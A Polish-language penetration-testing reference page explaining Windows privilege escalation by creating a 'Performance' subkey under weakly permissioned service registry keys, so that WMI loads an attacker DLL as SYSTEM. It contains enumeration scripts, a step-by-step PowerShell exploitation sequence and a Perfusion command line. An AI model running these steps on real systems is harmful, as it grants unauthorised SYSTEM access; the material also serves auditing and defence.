# Uprawnienie AppendData/AddSubdirectory w kluczu rejestru usługi

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Podsumowanie

Jeśli masz tylko uprawnienia **`Create Subkey`** / **`AppendData/AddSubdirectory`** do klucza rejestru usługi, nadal może to być dobry trop do privesc. Zwykle **nie możesz** bezpośrednio nadpisać istniejących wartości, takich jak `ImagePath`, `ServiceDll` lub innych, ale nadal możesz mieć możliwość utworzenia podrzędnego klucza **`Performance`** w:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Dowolnym innym kluczu **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, do którego token ma uprawnienie **`KEY_CREATE_SUB_KEY`**

Sztuczka polega na tym, że Windows nadal obsługuje starszy model rejestracji **PerfLib V1**. Jeśli usługa ma podklucz **`Performance`**, Windows może załadować DLL z tego miejsca, gdy consumer liczników wydajności zażąda danych.

Zgodnie z dokumentacją firmy Microsoft minimalna rejestracja wygląda następująco:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Z punktu widzenia atakującego wniosek jest następujący: **nie odrzucaj findingu dotyczącego rejestru usługi tylko dlatego, że uzyskano wyłącznie `CreateSubKey`, a nie `SetValue`**.<sup>[[3]](#references)</sup>

## Dlaczego to wystarcza do wykonania kodu

Podklucz `Performance` **zwykle nie istnieje domyślnie w przypadku tych usług**, dlatego potrzebnym prymitywem jest **`KEY_CREATE_SUB_KEY`**. Gdy klucz już istnieje i zawiera `Library`/`Open`/`Collect`/`Close`, dowolny **konsument liczników wydajności** może wywołać ładowanie DLL.<sup>[[3]](#references)</sup>

Kilka ważnych szczegółów:

- Wartość **`Library`** może wskazywać na **pełną ścieżkę do DLL**.
- DLL musi eksportować **`OpenPerfData`**, **`CollectPerfData`** oraz **`ClosePerfData`** i zwracać `ERROR_SUCCESS`.
- Kod jest wykonywany w **kontekście konsumenta**, **niekoniecznie w samym procesie podatnej usługi**.
- W klasycznym przypadku `RpcEptMapper` / `Dnscache` zapytanie **WMI performance** może spowodować, że **`wmiprvse.exe`** załaduje DLL jako **`NT AUTHORITY\SYSTEM`**.

Właśnie dlatego ten prymityw jest łatwy do przeoczenia podczas triage: nadrzędny klucz usługi nie jest „w pełni zapisywalny”, ale nadal można go weaponizować.

## Szybka enumeracja

Manual spot-check za pomocą **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Przykład PowerShell do wyszukiwania principalów o niskich uprawnieniach z uprawnieniem **`CreateSubKey`** do kluczy usług:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Przydatne narzędzia:

- **PrivescCheck**: `Get-ModifiableRegistryPath` zostało utworzone specjalnie do wykrywania tej klasy problemów.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatyzuje zrzucanie DLL, rejestrację `Performance`, wyzwalacz WMI, duplikowanie tokenu oraz czyszczenie na starszych podatnych celach (na przykład: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Przebieg wykorzystania

Utwórz podklucz `Performance` i uzupełnij wymagane wartości:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Następnie wyzwól **uprzywilejowanego** odbiorcę wydajności. Klasycznym przykładem jest zapytanie WMI dotyczące klas `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Uwagi operacyjne:

- Uruchomienie **`perfmon.exe`** jest przydatne do sprawdzenia, czy rejestracja countera jest poprawna, ale zwykle ładuje DLL tylko w **kontekście własnego użytkownika**.
- W przypadku rzeczywistego LPE wywołaj **uprzywilejowanego** konsumenta, takiego jak **WMI**.
- Jeśli piszesz własny exploit, bezpośrednie uruchomienie `cmd.exe` z poziomu DLL zwykle pozostawia Cię z shellem w **session 0**. `Perfusion` rozwiązuje ten problem, duplikując uprzywilejowany token do procesu utworzonego w stanie zawieszenia w sesji atakującego.<sup>[[4]](#references)</sup>
- Dopasuj architekturę DLL do docelowego konsumenta (**x64 w systemach x64**).

## Uwagi dotyczące wersji / nowsze zmiany

Historycznie słabymi wbudowanymi kluczami były:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` i `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` wskazuje, że aktualizacje z **kwietnia 2021 r.** usunęły łatwą ścieżkę eksploatacji w zaktualizowanych systemach **Windows 8 / Windows Server 2012**, natomiast **Windows 7 / Windows Server 2008 R2** pozostały podatne za pośrednictwem **`Dnscache`**.<sup>[[4]](#references)</sup>

Ten prymityw **nie ma wyłącznie historycznego znaczenia**. W **styczniu 2025 r.** firma Microsoft załatała powiązany problem AD DS, w którym członkowie grupy **`Network Configuration Operators`** mogli tworzyć podklucze w obszarze **`Dnscache`** i **`NetBT`**, a ten sam pomysł z **rejestracją DLL countera wydajności** można było ponownie wykorzystać do uzyskania **SYSTEM** w obsługiwanych systemach.<sup>[[2]](#references)</sup>

Współczesny wniosek jest ogólny: za każdym razem, gdy principal z niskimi uprawnieniami ma **`CreateSubKey`** dla **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, sprawdź, czy sam podklucz **`Performance`** wystarczy, zanim odrzucisz to znalezisko.

## References

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
